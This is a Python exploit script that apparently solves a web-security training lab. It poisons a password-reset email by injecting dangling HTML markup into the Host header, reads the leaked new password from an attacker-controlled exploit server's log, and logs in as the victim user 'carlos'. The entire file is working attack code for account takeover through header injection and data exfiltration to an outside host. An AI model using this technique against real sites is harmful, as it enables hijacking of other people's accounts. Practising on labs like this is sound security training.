import requests
from requests_toolbelt.adapters.host_header_ssl import HostHeaderSSLAdapter
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def get_csrf_token(s, url, path):
    target_url = url + path
    r = s.get(target_url)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value'] # type: ignore
    return csrf

def login_acc(s, url, path, username, password):
    login_url = url + path
    payload = {
        "username": username,
        "password": password,
        "csrf": get_csrf_token(s, url, path)
    }
    r = s.post(login_url, data=payload, allow_redirects=False)
    if r.status_code == 302:
        print(f'[+] Successful login {username} account')
    else:
        print(f'[-] Fail to login {username} account')
        sys.exit(-1)

def forgot_password(s, url, path, csrf_path, username, headers, cookies):
    target_url = url + path
    payload = {
        'username': username,
        'csrf': get_csrf_token(s, url, csrf_path)
    }
    r = s.post(target_url, data=payload, headers=headers, cookies=cookies)

    if 'Please check your email for details on how to recover your account.' in r.text and r.status_code == 200:
        print('[+] Sent password reset url to email')
    else:
        print('[-] Failed to trigger reset password')
        sys.exit(-1)

def extract_new_password(s, exploit_url, exploit_path):
    target_url = exploit_url + exploit_path
    r = s.get(target_url)
    new_password = r.text.split('to+login+with+your+new+password:+')[-1].split('&lt;/p&gt;&lt;p&gt;')[0]
    if new_password:
        print(f'[+] Victim leaked new password is {new_password}')
        return new_password
    else:
        print('[-] Failed to leak new password')
        sys.exit(-1)

def goto(s, url, path):
    target_url = url + path
    r = s.get(target_url)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 3:
        print("(+) Usage: %s <url> <exploit_url>" % sys.argv[0])
        print("(+) Example: %s www.example.com www.abc.exploit-server.net" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    # s.mount("https://", HostHeaderSSLAdapter())
    # s.proxies = proxies
    # s.verify = False
    url = sys.argv[1][:-1] if sys.argv[1][-1] == '/' else sys.argv[1] 
    exploit_url = sys.argv[2][:-1] if sys.argv[2][-1] == '/' else sys.argv[2]

    target_user = 'carlos'
    custom_headers = {
        'Host': f"""{url.split('//')[1]}:'<a href="{exploit_url}?"""
    }

    goto(s, url, '/')
    session_cookies = s.cookies.get_dict()
    forgot_password(s, url, '/forgot-password', '/forgot-password', target_user, custom_headers, session_cookies)
    new_password = extract_new_password(s, exploit_url, '/log')
    login_acc(s, url, '/login', target_user, new_password)
    check_solved_lab(s, url)

if __name__ == '__main__':
    main()